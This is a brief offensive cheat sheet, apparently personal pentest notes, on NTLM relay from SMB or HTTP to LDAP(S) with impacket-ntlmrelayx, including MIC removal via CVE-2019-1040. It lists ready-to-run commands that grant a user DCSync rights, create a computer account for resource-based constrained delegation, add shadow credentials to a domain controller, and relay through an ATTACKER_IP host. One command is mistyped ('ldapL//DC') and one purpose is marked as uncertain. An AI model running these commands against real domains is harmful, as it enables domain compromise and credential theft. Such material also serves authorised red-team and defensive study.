# SMB to LDAP(S) Relay

## Tools: impacket-ntlmrelayx

# NetNTLMv1/NetNTLMv2

#### 1) Remove mic (CVE-2019-1040 for NetNTLMv2)

#### 2) Relay to LDAP

    impacket-ntlmrelayx --remove-mic --escalate-user USER -t ldap://DC_FQDN -smb2support (Grant user DCSync privileges)

    impacket-ntlmrelayx -t ldaps://DC --remove-mic --add-computer COMPUTER_NAME COMPUTER_PASSWORD --delegate-access -smb2support (Create a computer account, then do a Resource Based Constrained Delegation attack)

    impacket-ntlmrelayx -t ldapL//DC --shadow-credentials --shadow-target 'DC' (Shadow Credentials attack)

    impacket-ntlmrelayx -wh ATTACKER_IP -t ldap://TARGET -l /tmp -6 -debug (Enumerate Users?)

## TIP: Same steps work for HTTP(S) to LDAP Relaying
